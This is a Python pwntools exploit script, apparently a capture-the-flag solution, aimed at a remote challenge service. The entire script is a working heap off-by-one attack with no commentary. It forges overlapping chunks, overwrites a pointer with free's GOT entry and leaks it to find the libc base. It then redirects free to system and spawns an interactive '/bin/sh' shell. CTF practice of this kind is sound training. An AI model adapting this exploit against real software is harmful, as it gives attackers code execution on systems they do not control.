from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28243)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def create(size, content):
    io.recvuntil("choice :")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.sendline(content)
def edit(idx, content):
    io.recvuntil("choice :")
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(idx))
    io.recvuntil(":")
    io.sendline(content)
def show(idx):
    io.recvuntil("choice :")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))
def delete(idx):
    io.recvuntil("choice :")
    io.sendline("4")
    io.recvuntil(":")
    io.sendline(str(idx))
create(0x18, "aaaa")  # 0
create(0x10, "bbbb")  # 1
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
delete(1)
create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got['free']))  #1
show(1)
io.recvuntil("Content : ")
data = io.recvuntil("Done !")
free = u64(data.split("\n")[0].ljust(8, "\x00"))
libc_base = free - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
edit(1, p64(system_addr))
delete(0)
io.interactive()
